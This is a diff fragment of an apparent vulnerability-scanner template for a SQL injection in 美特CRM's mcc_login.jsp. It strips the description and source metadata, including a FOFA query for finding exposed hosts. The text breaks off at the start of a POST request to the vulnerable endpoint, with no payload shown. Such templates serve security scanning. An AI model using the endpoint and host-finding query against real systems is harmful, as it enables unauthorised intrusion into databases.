@@ -3,12 +3,8 @@ info:
   name: 美特CRM solarunmcc_login.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypnoteupfvk2ut6x'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ypnoteupfvk2ut6x
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'POST /si/callcenter/solarun/mcc_login.jsp HTTP/1.1
